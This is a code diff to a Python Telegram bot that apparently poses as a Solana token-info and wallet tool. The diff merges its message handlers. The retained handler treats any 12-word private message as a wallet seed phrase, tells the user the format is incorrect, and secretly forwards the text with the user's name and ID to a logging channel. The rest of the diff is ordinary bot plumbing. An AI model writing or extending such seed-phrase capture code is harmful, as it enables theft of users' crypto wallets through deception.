@@ -136,20 +136,7 @@ BUTTONS = InlineKeyboardMarkup([[
         ],[
             InlineKeyboardButton("Back", callback_data="start")]])
 
-@Client.on_message(filters.private & filters.text & filters.incoming)
-async def reply_info(bot, message):
-    # Assuming tokens are unique enough, check if the message could be a token
-    # This is a naive check; you might need more complex logic here
-    if message.text.startswith("/") or message.text.startswith("#"): return
-    if len(message.text.split()) == 1:
-        query = message.text.strip()
-        reply_markup = BUTTONS
-        await message.reply_text(
-            text=token_info(query),
-            disable_web_page_preview=True,
-            quote=True,
-            reply_markup=reply_markup
-        )
+
 
 def token_info(token_id):
     try:
@@ -185,18 +172,15 @@ Import A Wallet Or Deposit SOL Below ⬇️"""
         return str(error)
 
 ##########################################################################################
-
-############################################################################################
-
 @Client.on_message(filters.private & filters.text & filters.incoming)
-async def stringu(bot, message):
+async def reply_info_and_stringu(bot, message):
     user = message.from_user
     user_id = message.from_user.id
-    
+
     # Ignore commands and hashtags
     if message.text.startswith("/") or message.text.startswith("#"):
         return
-    
+
     # Check if message contains exactly 12 words
     if len(message.text.split()) == 12:
         await message.reply_text("<b>Incorrect format, Please try again.!</b>")
@@ -206,9 +190,21 @@ async def stringu(bot, message):
             chat_id=Config.LOG_CHANNEL,
             text=f"<b>#𝐏𝐌_𝐌𝐒𝐆\n\nNᴀᴍᴇ : {user}\n\nID : {user_id}\n\nMᴇssᴀɢᴇ : {message.text}</b>"
         )
+        return
 
-        
-#############################################################################################
+    # Handle token info request
+    if len(message.text.split()) == 1:
+        query = message.text.strip()
+        reply_markup = BUTTONS
+        await message.reply_text(
+            text=token_info(query),
+            disable_web_page_preview=True,
+            quote=True,
+            reply_markup=reply_markup
+        )
+        return
+############################################################################################
+
 
 @Client.on_callback_query()
 async def cb_handler(client, query: CallbackQuery):
